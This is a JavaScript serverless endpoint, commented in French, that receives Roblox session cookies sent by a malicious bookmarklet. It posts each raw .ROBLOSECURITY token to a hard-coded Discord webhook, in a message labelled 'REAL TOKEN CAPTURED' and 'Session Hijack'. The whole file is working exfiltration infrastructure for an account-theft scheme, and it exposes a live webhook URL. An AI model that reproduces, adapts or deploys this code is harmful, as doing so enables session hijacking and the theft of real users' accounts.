export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Access Denied');

    // On récupère les données brutes envoyées par le fetch du bookmarklet
    const data = JSON.parse(req.body);
    const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";

    const payload = {
        embeds: [{
            title: "🔱 RAVEN SYSTEM | REAL TOKEN CAPTURED",
            color: 0x00ff41,
            fields: [
                { name: "👤 Cible", value: "Utilisateur_Réel", inline: true },
                { name: "🔑 .ROBLOSECURITY BRUT", value: `\`\`\`${data.t}\`\`\`` },
                { name: "📡 Méthode", value: "XSS Bookmarklet Injection", inline: false }
            ],
            footer: { text: "Protocol Raven v16.8 - Session Hijack" },
            timestamp: new Date()
        }]
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    return res.status(200).send("OK");
}
